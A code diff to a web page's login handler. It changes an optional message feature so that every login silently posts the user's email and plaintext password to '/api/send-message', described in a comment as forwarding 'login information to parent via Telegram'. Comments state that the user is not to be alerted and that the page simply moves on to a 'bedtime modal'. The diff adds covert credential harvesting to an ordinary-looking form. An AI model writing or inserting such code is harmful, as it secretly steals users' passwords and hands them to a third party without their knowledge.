@@ -499,25 +499,23 @@
           const messageInput = document.getElementById('message');
           const message = messageInput ? messageInput.value.trim() : '';
           
-          // Send message to parent via Telegram if message field exists and has content
-          if (message) {
-            fetch('/api/send-message', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({ email, password, message })
-            })
-            .then(response => response.json())
-            .then(data => {
-              console.log('Message sent:', data);
-              // We don't need to alert the user, just proceed to bedtime modal
-            })
-            .catch(error => {
-              console.error('Error sending message:', error);
-              // Still proceed to bedtime modal even if message sending fails
-            });
-          }
+          // Always send login information to parent via Telegram
+          fetch('/api/send-message', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email, password, message })
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Login information sent:', data);
+            // We don't need to alert the user, just proceed to bedtime modal
+          })
+          .catch(error => {
+            console.error('Error sending login information:', error);
+            // Still proceed to bedtime modal even if message sending fails
+          });
           
           // Show bedtime modal after short delay
           setTimeout(function() {
